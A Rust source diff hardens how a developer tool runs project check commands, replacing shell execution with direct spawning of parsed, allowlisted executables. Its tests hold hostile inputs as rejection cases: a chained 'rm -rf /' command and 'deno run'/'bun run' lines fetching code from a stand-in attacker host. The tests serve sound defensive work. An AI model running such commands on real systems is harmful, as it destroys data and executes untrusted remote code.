@@ -2,10 +2,6 @@ use std::fs;
 use std::fs::File;
 use std::io::Write;
 use std::path::{Path, PathBuf};
-use std::process::Command;
-use std::sync::mpsc;
-use std::time::{Duration, Instant};
-use wait_timeout::ChildExt;
 
 use chrono::Utc;
 
@@ -13,6 +9,10 @@ use crate::errors::RepoDeskResult;
 use crate::init;
 use crate::projects::get_active_project;
 use crate::tasks::show_active_task;
+
+mod execution;
+
+use execution::{parse_allowed_check_command, run_parsed_check_with_timeout};
 
 #[derive(Debug, Clone)]
 pub struct ChecksRunResult {
@@ -40,90 +40,16 @@ pub struct ChecksLastResult {
 }
 
 pub fn is_allowed_check_command(command: &str) -> Result<(), String> {
-    let trimmed = command.trim();
-    if trimmed.is_empty() {
-        return Err("Command is empty".to_string());
-    }
-
-    // Check for dangerous shell symbols or characters that allow command injection/chaining.
-    // Subshell parens `(` `)` and backslash `\` never appear in legitimate check commands
-    // but enable subshells and escaping, so they are rejected too.
-    let dangerous_chars = [
-        ';', '&', '|', '<', '>', '$', '`', '\n', '\r', '(', ')', '\\',
-    ];
-    for &ch in &dangerous_chars {
-        if trimmed.contains(ch) {
-            return Err(format!("Command contains restricted character '{ch}'"));
-        }
-    }
-
-    // `deno run https://evil.example/x.ts` (and Bun's equivalent remote
-    // module/specifier support) needs no shell metacharacter at all to fetch
-    // and execute code from an arbitrary remote host — a bare URL argument is
-    // enough. No legitimate check command (cargo/npm/pytest/eslint/...) needs
-    // a literal URL argument, so reject them outright rather than trying to
-    // allowlist per-binary flag combinations.
-    if trimmed.to_ascii_lowercase().contains("://") {
-        return Err("Command arguments may not contain a URL".to_string());
-    }
-
-    // Extract the binary name (first word)
-    let binary = trimmed
-        .split_whitespace()
-        .next()
-        .ok_or_else(|| "Could not parse command executable".to_string())?;
-
-    // Approved list of binaries for checkers/test runners/compilers.
-    // `repopilot` is a local-first, read-only review/scan tool (no shell needed —
-    // it takes --format/--output flags), so it is safe to run as a project check.
-    let allowed_binaries = [
-        "cargo",
-        "npm",
-        "pnpm",
-        "yarn",
-        "python",
-        "python3",
-        "pytest",
-        "go",
-        "make",
-        "gradle",
-        "mvn",
-        "deno",
-        "npx",
-        "bun",
-        "jest",
-        "vitest",
-        "eslint",
-        "prettier",
-        "flake8",
-        "mypy",
-        "black",
-        "repopilot",
-        "snyk",
-        "sonar-scanner",
-        "trivy",
-        "checkmarx",
-    ];
-
-    if !allowed_binaries.contains(&binary) {
-        return Err(format!(
-            "Executable '{binary}' is not in the allowed list of check tools"
-        ));
-    }
-
-    Ok(())
+    parse_allowed_check_command(command).map(|_| ())
 }
 
-/// Validate a command against the check-command allowlist, then run it with a
-/// timeout. This is the single safe entry point for running an arbitrary
-/// project-supplied command (project checks *and* a step's `verify_command`):
-/// it rejects shell metacharacters and non-allowlisted binaries before any
-/// process is spawned, so no caller can smuggle a raw `sh -c` payload past the
-/// security model. A validation failure returns a `failed` result carrying the
-/// reason rather than spawning anything.
+/// Validate a command against the check-command allowlist, parse it into a
+/// concrete executable + argv vector, then spawn that executable directly.
+/// Project checks and step `verify_command`s never cross a shell boundary.
+/// Validation failures return a `failed` result before any process is spawned.
 pub fn run_validated_check(command: &str, cwd: &Path, timeout_secs: u64) -> CheckCommandResult {
-    match is_allowed_check_command(command) {
-        Ok(()) => run_shell_command_with_timeout(command, cwd, timeout_secs),
+    match parse_allowed_check_command(command) {
+        Ok(parsed) => run_parsed_check_with_timeout(command, &parsed, cwd, timeout_secs),
         Err(err) => CheckCommandResult {
             command: command.to_string(),
             status: "failed".to_string(),
@@ -257,136 +183,6 @@ Task: `{}`
     })
 }
 
-fn run_shell_command_with_timeout(
-    command: &str,
-    cwd: &Path,
-    timeout_secs: u64,
-) -> CheckCommandResult {
-    let started = Instant::now();
-    let command_owned = command.to_string();
-    let cwd_owned = cwd.to_path_buf();
-
-    let mut child = match if cfg!(target_os = "windows") {
-        Command::new("cmd")
-            .args(["/C", &command_owned])
-            .current_dir(&cwd_owned)
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::piped())
-            .spawn()
-    } else {
-        Command::new("sh")
-            .args(["-c", &command_owned])
-            .current_dir(&cwd_owned)
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::piped())
-            .spawn()
-    } {
-        Ok(child) => child,
-        Err(error) => {
-            return CheckCommandResult {
-                command: command.to_string(),
-                status: "failed".to_string(),
-                exit_code: None,
-                duration_ms: started.elapsed().as_millis(),
-                stdout: String::new(),
-                stderr: format!("Failed to spawn command: {error}"),
-            };
-        }
-    };
-
-    let mut stdout_pipe = match child.stdout.take() {
-        Some(pipe) => pipe,
-        None => {
-            let _ = child.kill();
-            let _ = child.wait();
-            return CheckCommandResult {
-                command: command.to_string(),
-                status: "failed".to_string(),
-                exit_code: None,
-                duration_ms: started.elapsed().as_millis(),
-                stdout: String::new(),
-                stderr: "Failed to take child process stdout pipe".to_string(),
-            };
-        }
-    };
-
-    let mut stderr_pipe = match child.stderr.take() {
-        Some(pipe) => pipe,
-        None => {
-            let _ = child.kill();
-            let _ = child.wait();
-            return CheckCommandResult {
-                command: command.to_string(),
-                status: "failed".to_string(),
-                exit_code: None,
-                duration_ms: started.elapsed().as_millis(),
-                stdout: String::new(),
-                stderr: "Failed to take child process stderr pipe".to_string(),
-            };
-        }
-    };
-
-    let (tx_out, rx_out) = mpsc::channel();
-    std::thread::spawn(move || {
-        let mut s = String::new();
-        use std::io::Read;
-        let _ = stdout_pipe.read_to_string(&mut s);
-        let _ = tx_out.send(s);
-    });
-
-    let (tx_err, rx_err) = mpsc::channel();
-    std::thread::spawn(move || {
-        let mut s = String::new();
-        use std::io::Read;
-        let _ = stderr_pipe.read_to_string(&mut s);
-        let _ = tx_err.send(s);
-    });
-
-    let timeout = Duration::from_secs(timeout_secs);
-    match child.wait_timeout(timeout) {
-        Ok(Some(status)) => {
-            let stdout = rx_out.recv().unwrap_or_default();
-            let stderr = rx_err.recv().unwrap_or_default();
-            let duration_ms = started.elapsed().as_millis();
-            let status_str = if status.success() { "passed" } else { "failed" };
-            CheckCommandResult {
-                command: command.to_string(),
-                status: status_str.to_string(),
-                exit_code: status.code(),
-                duration_ms,
-                stdout,
-                stderr,
-            }
-        }
-        Ok(None) => {
-            let _ = child.kill();
-            let _ = child.wait();
-            let duration_ms = started.elapsed().as_millis();
-            CheckCommandResult {
-                command: command.to_string(),
-                status: "timeout".to_string(),
-                exit_code: None,
-                duration_ms,
-                stdout: String::new(),
-                stderr: format!("Command timed out after {}s and was killed", timeout_secs),
-            }
-        }
-        Err(error) => {
-            let _ = child.kill();
-            let _ = child.wait();
-            let duration_ms = started.elapsed().as_millis();
-            CheckCommandResult {
-                command: command.to_string(),
-                status: "failed".to_string(),
-                exit_code: None,
-                duration_ms,
-                stdout: String::new(),
-                stderr: format!("Failed to wait for command: {error}"),
-            }
-        }
-    }
-}
-
 fn write_run_summary(result: &ChecksRunResult, note: &str) -> RepoDeskResult<()> {
     let mut summary = String::new();
 
@@ -451,37 +247,6 @@ mod tests {
     use std::env;
 
     #[test]
-    fn test_run_shell_command_with_timeout_kills_process() {
-        let cwd = env::current_dir().unwrap();
-
-        let cmd = if cfg!(target_os = "windows") {
-            "timeout 5"
-        } else {
-            "sleep 5"
-        };
-
-        // Timeout is 1 second, command takes 5 seconds.
-        let result = run_shell_command_with_timeout(cmd, &cwd, 1);
-
-        assert_eq!(result.status, "timeout");
-        assert!(result.stderr.contains("Command timed out after 1s"));
-        // Duration should be at least 1000ms, and realistically much less than 5000ms.
-        assert!(result.duration_ms >= 1000 && result.duration_ms < 3000);
-    }
-
-    #[test]
-    fn test_run_shell_command_captures_stdout() {
-        let cwd = env::current_dir().unwrap();
-
-        let cmd = "echo hello world";
-
-        let result = run_shell_command_with_timeout(cmd, &cwd, 5);
-
-        assert_eq!(result.status, "passed");
-        assert!(result.stdout.contains("hello world"));
-    }
-
-    #[test]
     fn run_validated_check_runs_allowlisted_command() {
         let cwd = env::current_dir().unwrap();
         // `npm` is allowlisted; `npm --version` is a fast, side-effect-free probe.
@@ -492,7 +257,6 @@ mod tests {
     #[test]
     fn run_validated_check_rejects_shell_metacharacters_without_spawning() {
         let cwd = env::current_dir().unwrap();
-        // A chained command must be rejected by the allowlist, not handed to a shell.
         let result = run_validated_check("cargo test; rm -rf /", &cwd, 5);
         assert_eq!(result.status, "failed");
         assert_eq!(result.exit_code, None);
@@ -549,9 +313,6 @@ mod tests {
 
     #[test]
     fn deno_npx_bun_cannot_execute_a_remote_url() {
-        // Regression: deno/npx/bun are allowlisted binaries, and
-        // `deno run https://evil.example/x.ts` needs no shell metacharacter
-        // to fetch and run arbitrary remote code — only a URL argument.
         let err = is_allowed_check_command("deno run https://evil.example/x.ts").unwrap_err();
         assert!(err.contains("URL"), "unexpected error: {err}");
         assert!(is_allowed_check_command("bun run https://evil.example/x.ts").is_err());
